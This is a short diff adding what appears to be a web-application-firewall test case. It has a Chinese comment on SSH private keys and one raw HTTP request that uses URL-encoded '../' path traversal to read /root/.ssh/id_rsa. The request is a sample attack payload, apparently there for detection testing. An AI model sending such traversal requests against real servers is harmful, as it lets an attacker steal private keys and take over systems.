@@ -1,0 +1,9 @@
+# 目录遍历_/root/.ssh/id_rsa
+# /root/.ssh/id_rsa 通常存储着用户的私钥。在SSH（Secure Shell）密钥认证中，私钥用于对连接进行身份验证，而公钥则被放置在远程服务器上，用于验证私钥的持有者。
+GET /?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Froot%2F.ssh%2Fid_rsa&bid=hd_tag_m8mv23t6 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23t6
+RM-PRO-Token: 4827ce8d636b9705f4acb98b6126a23f
+RM-PRO-Time: 1742808343300
+User-Agent: curl/7.83.1
+
